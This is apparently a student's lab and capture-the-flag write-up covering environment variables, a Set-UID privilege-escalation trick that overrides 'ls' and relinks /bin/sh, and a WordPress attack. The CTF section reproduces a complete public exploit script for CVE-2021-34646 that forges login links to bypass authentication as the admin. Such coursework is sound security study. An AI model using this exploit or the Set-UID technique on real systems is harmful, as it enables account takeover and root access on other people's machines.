# Trabalho realizado na Semana #4
## Task 1
After opening a shell we type the command `printenv` and it shows all the environment variables:
- ![Task1-1](/Images/Week4/Task1-1.png "Task1-1")

Then we try a different command `export`:
- ![Task1-2](/Images/Week4/Task1-2.png "Task1-2")

## Task 2
We started by compiling `myprintenv.c` with 
- `$gcc myprintenv.c` which gerenated a binary called `a.out`.

Then we runned it and saved the output into a file using:
- `a.out > file`

After commenting out the `printenv()` statement in the child process case, and uncomment the `printenv()` statement in the parent process case we redid the first steps.
- `$gcc myprintenv.c`
- `a.out > file2`

This time we called the file `file2` so we could use the command 
- `diff file file2`
- ![Task2-3](/Images/Week4/Task2-3.png "Task2-3")

Which showed us that there are not any differences between the father and child variables because the child process inherited all his father's variables.

## Task 3
We start by executing what is descripted in the guide:
- Compile the file that includes the given program and execute it
- ![Task3](/Images/Week4/Task3-1.png "Task3-1")

Then we change one line on the`myenv.c` file as showned:
- ![Task3-2-1](/Images/Week4/Task3-2-1.png "Task3-2-1")
- ![Task3-2-2](/Images/Week4/Task3-2-2.png "Task3-2-2")

Lastly recompile this file and execute it:
- ![Task3-2](/Images/Week4/Task3-2.png "Task3-2")

## Task4 
After creating the file with the given code, we compiled and executed it as showned:
- `gcc task4.c -o task4`
- `./task4`
- ![Task4](/Images/Week4/Task4.png "Task4")
## Task 6
We start by executing what is descripted in the guide:
- Compile the file that includes the given program
- Change it's ownership to root using `sudo chown root <filepath/filename>`
- Become root user using `sudo -i`
- Make the program a SET-UID program by using `chmod u+s <filepath/filename>`
- Logout to a common user using `logout`

Now we can run malicious code by replacing the ls command and or by redirecting the shell program to execute another malicious command named cmd, per example:
"#!/bin/bash

function ls() {
  echo 'You have been hacked!'
}"

As the program is SET-UID and the program owner is the root, the program will run with root privileges, accounting that /bin/sh links to /bin/zsh instead of /bin/dash, so the `sudo ln -sf /bin/zsh /bin/sh` is needed.

<br>

## CTF
### Resolution

#### Recognition:

- Wordpress version and plugins:

![Recognition](/Images/Week4/CTF4/Recognition.PNG "Recognition")

- Possíveis utilizadores e nomes de utilizadores:

![Users](/Images/Week4/CTF4/Users.PNG "Users")

#### Vulnerability choice

We found the CVE-2021-34646 for the version 5.4.3 Boster for Wordpress that we choose as the vulnerability to attack.

#### Exploit

For the CVE choosen we found the following exploit:

```
# Exploit Title: WordPress Plugin WooCommerce Booster Plugin 5.4.3 - Authentication Bypass
# Date: 2021-09-16
# Exploit Author: Sebastian Kriesten (0xB455)
# Contact: https://twitter.com/0xB455
#
# Affected Plugin: Booster for WooCommerce
# Plugin Slug: woocommerce-jetpack
# Vulnerability disclosure: https://www.wordfence.com/blog/2021/08/critical=-authentication-bypass-vulnerability-patched-in-booster-for-woocommerce/
# Affected Versions: <= 5.4.3
# Fully Patched Version: >= 5.4.4
# CVE: CVE-2021-34646
# CVSS Score: 9.8 (Critical)
# Category: webapps
#
# 1:
# Goto: https://target.com/wp-json/wp/v2/users/
# Pick a user-ID (e.g. 1 - usualy is the admin)
#
# 2:
# Attack with: ./exploit_CVE-2021-34646.py https://target.com/ 1
#
# 3:
# Check-Out  out which of the generated links allows you to access the system
#
import requests,sys,hashlib
import argparse
import datetime
import email.utils
import calendar
import base64

B = "\033[94m"
W = "\033[97m"
R = "\033[91m"
RST = "\033[0;0m"

parser = argparse.ArgumentParser()
parser.add_argument("url", help="the base url")
parser.add_argument('id', type=int, help='the user id', default=1)
args = parser.parse_args()
id = str(args.id)
url = args.url
if args.url[-1] != "/": # URL needs trailing /
        url = url + "/"

verify_url= url + "?wcj_user_id=" + id
r = requests.get(verify_url)

if r.status_code != 200:
        print("status code != 200")
        print(r.headers)
        sys.exit(-1)

def email_time_to_timestamp(s):
    tt = email.utils.parsedate_tz(s)
    if tt is None: return None
    return calendar.timegm(tt) - tt[9]

date = r.headers["Date"]
unix = email_time_to_timestamp(date)

def printBanner():
    print(f"{W}Timestamp: {B}" + date)
    print(f"{W}Timestamp (unix): {B}" + str(unix) + f"{W}\n")
    print("We need to generate multiple timestamps in order to avoid delay related timing errors")
    print("One of the following links will log you in...\n")

printBanner()



for i in range(3): # We need to try multiple timestamps as we don't get the exact hash time and need to avoid delay related timing errors
        hash = hashlib.md5(str(unix-i).encode()).hexdigest()
        print(f"{W}#" + str(i) + f" link for hash {R}"+hash+f"{W}:")
        token='{"id":"'+ id +'","code":"'+hash+'"}'
        token = base64.b64encode(token.encode()).decode()
        token = token.rstrip("=") # remove trailing =
        link = url+"my-account/?wcj_verify_email="+token
        print(link + f"\n{RST}")
```
Then ran it:

![Command](/Images/Week4/CTF4/Command.jpeg "Users")
